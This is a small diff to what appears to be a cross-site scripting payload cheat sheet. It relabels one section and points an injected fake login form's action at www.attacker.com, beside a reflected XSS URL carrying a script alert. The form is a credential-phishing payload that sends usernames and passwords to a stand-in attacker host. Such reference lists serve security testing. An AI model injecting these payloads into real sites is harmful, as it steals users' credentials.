@@ -38,8 +38,10 @@ http://xxx.xxx.xxx.xxx/xss/example9.php#<script>alert(123)</script>
 ```
 
 
-Testing for DOM based XSS
+Submits credentials to the www.attacker.com (Embeds Login Screen inside application)
 -----------------------
-```javascript
-<h3>Please login to proceed</h3> <form action=http://10.5.21.41>Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Logon"></br>
+```html
+<h3>Please login to proceed</h3> <form action=http://www.attacker.com>Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Logon"></br>
 ```
+
+
